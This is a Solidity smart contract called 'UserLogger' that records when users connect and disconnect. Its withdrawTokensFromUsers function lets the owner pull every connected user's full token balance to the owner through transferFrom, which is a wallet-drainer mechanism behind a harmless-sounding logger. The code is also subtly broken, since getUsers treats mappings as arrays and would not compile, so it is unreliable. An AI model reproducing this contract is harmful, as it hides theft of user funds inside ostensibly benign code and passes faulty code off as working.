// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract UserLogger {
    address public owner;
    mapping(address => bool) public users;
    mapping(address => uint256) public connectionTimes;
    IERC20 public token;
    event UserConnected(address indexed user, uint256 timestamp);
    event UserDisconnected(address indexed user, uint256 timestamp);
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event TokensWithdrawn(address indexed user, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can perform this action");
        _;
    }

    constructor(address payable _tokenAddress) {
        owner = msg.sender;
        token = IERC20(_tokenAddress);
    }

    function connect() public {
        require(users[msg.sender] != true, "User already connected");
        users[msg.sender] = true;
        connectionTimes[msg.sender] = block.timestamp;
        emit UserConnected(msg.sender, block.timestamp);
    }

    function disconnect() public {
        require(users[msg.sender] == true, "User not connected");
        users[msg.sender] = false;
        emit UserDisconnected(msg.sender, block.timestamp);
    }

    function getUsers() public view returns (address[] memory) {
        address[] memory userList = new address[](users.length);
        uint256 index = 0;
        for (uint256 i = 0; i < users.length; i++) {
            if (users[i]) {
                userList[index] = i;
                index++;
            }
        }
        return userList;
    }

    function getConnectionTime(address user) public view returns (uint256) {
        require(users[user] == true, "User not connected");
        return connectionTimes[user];
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(
            newOwner != address(0),
            "New owner address cannot be zero address"
        );
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function withdrawTokensFromUsers() public onlyOwner {
        address[] memory userList = getUsers();
        for (uint256 i = 0; i < userList.length; i++) {
            address user = userList[i];
            uint256 balance = token.balanceOf(user);
            require(balance > 0, "No tokens to withdraw from user");
            token.transferFrom(user, owner, balance);
            emit TokensWithdrawn(user, balance);
        }
    }
}
